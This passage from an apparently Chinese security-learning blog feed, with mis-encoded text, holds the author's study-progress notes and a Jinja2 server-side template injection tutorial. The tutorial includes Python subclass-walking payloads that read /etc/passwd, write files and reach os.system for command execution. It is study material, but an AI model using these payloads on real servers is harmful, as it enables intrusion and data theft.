&lt;p>&lt;a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgiåè®®åˆ†æ &amp;amp;&amp;amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;amp;&amp;amp; Expç¼–å†™&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA">ã€æŠ€æœ¯åˆ†äº«ã€‘æ·±å…¥ FTP æ”»å‡» php-fpm ç»•è¿‡ disable_functions&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä¸€ç‚¹å¯¹è¿‘å†µçš„ç¢ç¢å¿µ
&lt;/h4>
&lt;/summary>
&lt;p>æœ€è¿‘æœ‰ç‚¹è‡ªé—­ï¼Œçœ‹ç€é‚£ä¹ˆå¤šå’Œæˆ‘å­¦ä¹ æ—¶é—´å·®ä¸å¤šçš„å¸ˆå‚…éƒ½å·²ç»ç›¸å½“ç›¸å½“å‰å®³äº†ï¼Œæˆ‘è¿˜æ˜¯è·Ÿåˆšå¼€å§‹ä¸€æ ·èœï¼Œæ»¡æ‰“æ»¡ç®—å­¦äº†ä¹ŸåŠå¹´å¤šäº†ï¼Œæ€ä¹ˆå°±è¿™ä¹ˆèœå‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿå·®è·å¤ªå¤§äº†ï¼Œä»–å¦ˆçš„å°±æ˜¯èœå•Š&lt;/p>
&lt;p>çœ‹çœ‹åˆ«äººåšå®¢éƒ½å†™å¾—å•¥ï¼Œcveå¤ç°ï¼Œæ¼æ´æŒ–æ˜ï¼Œæ¸—é€å®æˆ˜ï¼Œå®‰å…¨ç ”ç©¶ï¼Œæˆ‘å‘¢ï¼Ÿå…¨æ˜¯äº’è”ç½‘æ¹¿åƒåœ¾ï¼Œæ²¡ä¸€ç‚¹å«é‡‘é‡ï¼Œå°±ä¼šå†™ä¸€ç‚¹wpï¼Œè¿˜å¤§å¤šéƒ½æ˜¯å‚è€ƒäº†åˆ«äººçš„å†…å®¹ï¼Œç„¶åå†™ä¸€ç‚¹çŸ¥è¯†æ€»ç»“ï¼Œè·Ÿä¸ªå°å­¦ç”Ÿä¸€æ ·&lt;/p>
&lt;p>è¿™å‘¨ä¸‹äº†å†³å¿ƒæŠŠæ²¡ç”¨çš„è¯¾çš„å‡è¯·æ‰äº†ï¼Œå¸Œæœ›è‡ªå·±èƒ½å¥½å¥½åˆ©ç”¨èµ·æ¥ï¼Œåˆ«æ‘†äº†ï¼ŒçœŸåˆ«æ‘†äº†ï¼Œè¦å‡ºå¤§é—®é¢˜&lt;/p>
&lt;p>ä¸è¿‡æ€»ç»“æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œç°åœ¨çš„è¿›åº¦æ˜¯è¿™æ ·ï¼š&lt;/p>
&lt;ul>
&lt;li>phpååºåˆ—åŒ–ï¼šç¼º åŸç”Ÿç±»çš„å­¦ä¹ +è·Ÿä¸€äº›å®é™…çš„é“¾å­&lt;/li>
&lt;li>pythonååºåˆ—åŒ–ï¼šå®Œ&lt;/li>
&lt;li>sqliï¼šå·®ä¸å¤šå®Œï¼Œè¿˜å¾—å¤šåšç‚¹é¢˜åŠ æ·±ç†è§£&lt;/li>
&lt;li>SSTIï¼šå®Œ&lt;/li>
&lt;li>æ–‡ä»¶ä¸Šä¼ ï¼šä¹‹å‰9æœˆæ€»ç»“åˆ°ä¸€åŠå»æ‰“hvväº†&lt;/li>
&lt;li>php-fpmï¼šå®Œ&lt;/li>
&lt;li>GraphQLï¼šå®Œ&lt;/li>
&lt;/ul>
&lt;p>å¾ˆè–„å¼±çš„åœ°æ–¹éƒ½è¿˜æ²¡æŒæ¡ï¼ˆè¿™ä¸æ˜¯åºŸè¯ï¼‰ï¼Œå‡ ä¸ªæ€¥éœ€æ€»ç»“æŒæ¡çš„ï¼š&lt;/p>
&lt;ul>
&lt;li>ssrfï¼šä¸ç†Ÿç»ƒ&lt;/li>
&lt;li>xssï¼šåšé¢˜é‡åˆ°éƒ½æ˜¯èº²ç€èµ°&lt;/li>
&lt;li>jsåœ†å½¢æ±¡æŸ“ï¼šè·Ÿä¸Šé¢é‚£ä¸ªæ€»æ˜¯ä¸€èµ·å‡ºç°&lt;/li>
&lt;li>xxe&lt;/li>
&lt;li>xsleaks&lt;/li>
&lt;/ul>
&lt;p>è¿˜æœ‰javaï¼Œè¿™ä¸ªå¿…é¡»å¾—å­¦&lt;/p>
&lt;p>ä¸å¤šè¯´äº†ï¼Œå†²ï¼ï¼ï¼&lt;/p>
&lt;/details></description></item><item><title>SSTIå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</link><pubDate>Mon, 08 Nov 2021 20:59:28 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</guid><description>&lt;p>æ¨¡æ¿æ¸²æŸ“å¯ä»¥å€ŸåŠ©ä»£ç æ„é€ ï¼ˆå¦‚æ¡ä»¶ã€å¾ªç¯è¯­å¥ç­‰ï¼‰ååˆ†æ–¹ä¾¿çš„åŠ¨æ€å‘ˆç°å†…å®¹ï¼Œä½†å¦‚æœç¼–å†™ä¸å½“å®¹æ˜“è¢«æ”»å‡»è€…æ³¨å…¥æ¶æ„å†…å®¹ä»è€Œæš´éœ²ä¸Šä¸‹æ–‡æ•°æ®ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œæ‰§è¡Œä»»æ„å‘½ä»¤çš„è¡¨è¾¾å¼&lt;/p>
&lt;h1 id="jinja">Jinja&lt;/h1>
&lt;p>Jinja2æ˜¯ä¸€ç§é¢å‘Pythonçš„ç°ä»£å’Œè®¾è®¡å‹å¥½çš„æ¨¡æ¿è¯­è¨€ï¼Œä»¥Djangoçš„æ¨¡æ¿ä¸ºæ¨¡å‹ï¼Œæ˜¯Flaskæ¡†æ¶çš„ä¸€éƒ¨åˆ†&lt;/p>
&lt;p>Jinja2 èƒ½è¯†åˆ«æ‰€æœ‰ç±»å‹çš„å˜é‡ï¼Œç”šè‡³æ˜¯ä¸€äº›å¤æ‚çš„ç±»å‹ï¼Œä¾‹å¦‚åˆ—è¡¨ã€å­—å…¸å’Œå¯¹è±¡ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä½¿ç”¨&lt;u>è¿‡æ»¤å™¨&lt;/u>ä¿®æ”¹å˜é‡ï¼Œè¿‡æ»¤å™¨åæ·»åŠ åœ¨å˜é‡åä¹‹åï¼Œä¸­é—´ä½¿ç”¨ç«–çº¿åˆ†éš”ï¼ˆè¿™å¾ˆæœ‰åˆ©äºæˆ‘ä»¬æ„é€ æ¶æ„çš„payloadï¼‰ï¼Œæ¯”å¦‚è¿™æ ·çš„æ¨¡æ¿å¯ä»¥ç”¨é¦–å­—æ¯å¤§å†™å½¢å¼æ˜¾ç¤ºå˜é‡nameçš„å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>Hello, {{name|capitalize}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Jinjia2ä¹Ÿæ”¯æŒæ§åˆ¶è¯­å¥ï¼Œæ¯”å¦‚è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„&lt;u>forè¯­å¥&lt;/u>çš„æ¸²æŸ“æƒ…å†µ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {% for comment in comments %}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>{{comment}}&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {% endfor %}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹‹æ‰€ä»¥æœ‰æ¨¡æ¿æ¸²æŸ“çš„æ¼æ´æ˜¯å› ä¸ºåœ¨æ¸²æŸ“ä¼ é€’è¿›å»çš„å‚æ•°æ—¶æ¨¡æ¿å¯ä»¥ç›´æ¥è®¿é—®Pythonçš„ä¸€äº›å¯¹è±¡åŠæ–¹æ³•ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ªé•¿é•¿çš„ç»§æ‰¿é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶è¯»å†™&amp;amp;å‘½ä»¤æ‰§è¡Œ&lt;/p>
&lt;ul>
&lt;li>&lt;code>__dict__&lt;/code>ï¼šä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸&lt;/li>
&lt;li>&lt;code>__class__&lt;/code>ï¼šè¿”å›ä¸€ä¸ªå®ä¾‹æ‰€å±çš„ç±»ï¼›pythonä¸­çš„æ–°å¼ç±»ï¼ˆæ˜¾ç¤ºç»§æ‰¿objectå¯¹è±¡çš„ç±»ï¼‰éƒ½æœ‰ä¸€ä¸ªå±æ€§&lt;code>__class&lt;/code>ç”¨äºè·å–å½“å‰å®ä¾‹å¯¹åº”çš„ç±»&lt;/li>
&lt;li>&lt;code>__mro__&lt;/code>ï¼šè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æï¼ˆå³MRO - Method Resolution Orderï¼‰&lt;/li>
&lt;li>&lt;code>__bases__&lt;/code>ï¼šä»¥å…ƒç»„å½¢å¼è¿”å›ä¸€ä¸ªç±»ç›´æ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå¯ä»¥ç†è§£ä¸ºç›´æ¥çˆ¶ç±»ï¼‰&lt;/li>
&lt;li>&lt;code>__base__&lt;/code>ï¼šè¿”å›ä¸€ä¸ªç±»ç›´æ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå•ä¸ªï¼‰ï¼ˆç›¸å½“äº&lt;code>__bases__[0]&lt;/code>ï¼‰ï¼Œå’Œ&lt;code>__mro__&lt;/code>éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„&lt;/li>
&lt;li>&lt;code>__subclasses__&lt;/code>ï¼šä»¥åˆ—è¡¨å½¢å¼è¿”å›ç±»çš„æ‰€æœ‰å­˜æ´»å­ç±»çš„å¼•ç”¨ï¼ˆè€Œéå®ä¾‹ï¼‰ï¼›pythonä¸­çš„ç±»éƒ½ç»§æ‰¿è‡ªobjectï¼Œåªè¦è°ƒç”¨objectç±»å¯¹è±¡çš„&lt;code>__subclasses__()&lt;/code>æ–¹æ³•å°±å¯ä»¥è·å–æƒ³è¦çš„å­ç±»&lt;/li>
&lt;li>&lt;code>__init__&lt;/code>ï¼šç±»çš„åˆå§‹åŒ–æ–¹æ³•&lt;/li>
&lt;li>&lt;code>__globals__&lt;/code>ï¼šå¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥è·å–file, osç­‰æ¨¡å—&lt;/li>
&lt;li>&lt;code>__builtin__&lt;/code>&amp;amp;&amp;amp;&lt;code>__builtins__&lt;/code>ï¼šè¿”å›ä¸ç”¨å¯¼å…¥æ¨¡å—å¯ä»¥ç›´æ¥è¿è¡Œä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚int()ï¼Œlist()ç­‰å†…å»ºå‡½æ•°ï¼ŒæŸ¥çœ‹çš„æ–¹æ³•æ˜¯&lt;code>dir(__builtins__)&lt;/code>ã€€ã€€
&lt;ul>
&lt;li>åœ¨py2ä¸­&lt;code>__builtins__&lt;/code>æ¨¡å—æ˜¯è§£é‡Šå™¨è‡ªåŠ¨åˆ›å»ºçš„å¯¹äº&lt;code>__builtin__&lt;/code>æ¨¡å—çš„å¼•ç”¨ï¼Œå¹¶é&lt;code>__buitin__&lt;/code>æœ¬èº«ï¼ˆåœ¨ä¸»æ¨¡å—ä¸­æ—¶ï¼Œæƒ…å†µç±»ä¼¼æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå˜é‡å¹¶å¯¹å®ƒåšä¸€æ¬¡å¼•ç”¨ä¼ é€’ï¼Œä¸¤è€…æ˜¯ä¸€æ ·çš„ï¼ŒæŒ‡å‘ç›¸åŒï¼›å½“ä¸æ˜¯ä¸»æ¨¡å— è€Œæ˜¯æˆ‘ä»¬åˆ›å»ºçš„ä¸€ä¸ªå¯ä»¥è¢«å¯¼å…¥çš„æ¨¡å—æ—¶ï¼Œ&lt;code>__builtins__&lt;/code>å…¶å®æ˜¯å¯¹&lt;code>__builtin__.__dict__&lt;/code>æ¨¡å—çš„å¼•ç”¨ï¼‰&lt;/li>
&lt;li>åœ¨py3ä¸­&lt;code>__builtin__&lt;/code>è¢«å‘½åä¸º&lt;code>builtins&lt;/code>&lt;/li>
&lt;li>å‚è€ƒï¼š&lt;a href="https://blog.51cto.com/xpleaf/1764849">æ·±å…¥ç†è§£Pythonä¸­çš„&lt;code>__builtin__&lt;/code>å’Œ&lt;code>__builtins__&lt;/code>&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> ä¸ &lt;code>__builtin__&lt;/code>ï¼ˆbuiltinsï¼‰&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="æ„é€ çš„åŸç†">æ„é€ çš„åŸç†&lt;/h2>
&lt;p>ä¸€è¨€ä»¥è”½ä¹‹ï¼šé€šè¿‡ä¸€ä¸ªé•¿é•¿çš„è°ƒç”¨ç»§æ‰¿é“¾æ¥å°†å†…å»ºçš„å‡½æ•°æˆ–æ¨¡å—æªå‡ºæ¥ç”¨&lt;/p>
&lt;h3 id="step1---æ‰¾åˆ°åŸºç±»object">step1 - æ‰¾åˆ°åŸºç±»object&lt;/h3>
&lt;p>é€šè¿‡å­—ç¬¦ä¸²ã€å­—å…¸ã€åˆ—è¡¨ã€å…ƒç»„å’Œå¾ˆç‰¹æ®Šçš„requestæ¥è·å–åŸºç±»objectï¼Œmroå’Œbases[0]å‡å¯ï¼ˆæˆ–è€…æ˜¯base ä¸€æ ·çš„æ•ˆæœï¼Œä¸ä¸€ä¸€åˆ—ä¸¾ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108104543559.png" alt="image-20211108104543559">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{}&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step2---è·å¾—èƒ½ç”¨çš„å­ç±»">step2 - è·å¾—â€œèƒ½ç”¨çš„â€å­ç±»&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šä»¥åˆ—è¡¨å½¢å¼è¿”å›objectåŸºç±»ä¸‹çš„æ‰€æœ‰å­ç±»ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯å…¶ä¸­å«æœ‰&lt;code>os&lt;/code>, &lt;code>file&lt;/code>, &lt;code>__builtins__&lt;/code>æ¨¡å—çš„å­ç±»ï¼›è¿™é‡Œç»™å‡ºä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥å•ç‹¬å¯»æ‰¾ç‰¹å®šå­ç±»ï¼Œä¹Ÿå¯ä»¥æ ¹æ®æƒ³è¦çš„æ¨¡å—æ‰¾åˆ°å¯¹åº”çš„å­ç±»ï¼Œè¿”å›ç´¢å¼•ä½ç½®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># py2 &amp;amp; py3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;warnings.WarningMessage&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">raw&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[*] &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> - &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">keys&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108115828170.png" alt="image-20211108115828170">åˆ°è¿™ä¸€æ­¥å¯ä»¥å¾—åˆ°çš„&lt;/p>
&lt;p>åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬çš„payloadå·²ç»æ„é€ å¥½ä¸€åŠäº†ï¼ˆä»¥ä¸‹indexå‡æŒ‡æˆ‘ä»¬éœ€è¦çš„subclassçš„ç´¢å¼•ä½ç½®ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step3---è°ƒç”¨ç›¸å…³å‡½æ•°è¿›è¡Œrce">step3 - è°ƒç”¨ç›¸å…³å‡½æ•°è¿›è¡Œrce&lt;/h3>
&lt;h4 id="py2---fileoslinecache">py2 - file&amp;amp;os&amp;amp;linecache&lt;/h4>
&lt;p>&lt;code>&amp;lt;type 'file'&amp;gt;&lt;/code>æ˜¯py2çš„ä¸“å±ï¼Œç›´æ¥å¯ä»¥ç”¨&lt;code>read()&lt;/code>, &lt;code>write()&lt;/code>, &lt;code>readlines()&lt;/code>è¿›è¡Œæ–‡ä»¶è¯»å†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>os&lt;/code>æ¨¡å—å°±ä¸å¿…è¯´äº†ï¼Œæœ‰&lt;code>system()&lt;/code>å¯ä»¥ç›´æ¥rceçš„å‡½æ•°ï¼›åœ¨py2ä¸­è¿™ä¸¤ä¸ªå­ç±»å¯ä»¥ç›´æ¥ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site._Printer&amp;#39;&amp;gt;, 71&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site.Quitter&amp;#39;&amp;gt;, 76&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span 